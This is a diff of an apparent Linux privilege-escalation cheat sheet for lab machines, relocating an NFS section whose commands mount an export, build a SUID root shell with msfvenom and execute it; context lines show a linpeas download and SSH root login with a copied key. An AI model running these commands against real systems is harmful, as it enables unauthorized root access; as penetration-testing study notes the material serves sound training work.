@@ -132,7 +132,19 @@ curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas
 
 # 4. MISCONFIGURATIONS/VULNERABILITIES EXPLOITATION 
 
-## CATEGORY "SERVICES" - SERVICE EXPLOITS
+## CATEGORY "SERVICES" - NFS
+```
+cat /etc/exports
+sudo su
+mkdir /tmp/nfs
+mount -o rw,vers=3 10.10.13.43:/tmp /tmp/nfs
+cd /tmp/nfs  
+msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
+chmod +xs /tmp/nfs/shell.elf
+/tmp/shell.elf
+```
+
+## CATEGORY "SERVICES" - MYSQL EXPLOITS
 check mysql database version
 ```
 mysql -V
@@ -448,18 +460,6 @@ ls -l /.ssh
 chmod 600 root_key
 ssh root@10.10.10.1 -i root_key
 ssh -i root_key -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa root@10.10.36.3
-```
-
-## CATEGORY "" - NFS
-```
-cat /etc/exports
-sudo su
-mkdir /tmp/nfs
-mount -o rw,vers=3 10.10.13.43:/tmp /tmp/nfs
-cd /tmp/nfs  
-msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
-chmod +xs /tmp/nfs/shell.elf
-/tmp/shell.elf
 ```
 
 ## CATEGORY "KERNEL VULNERABILITIES"   
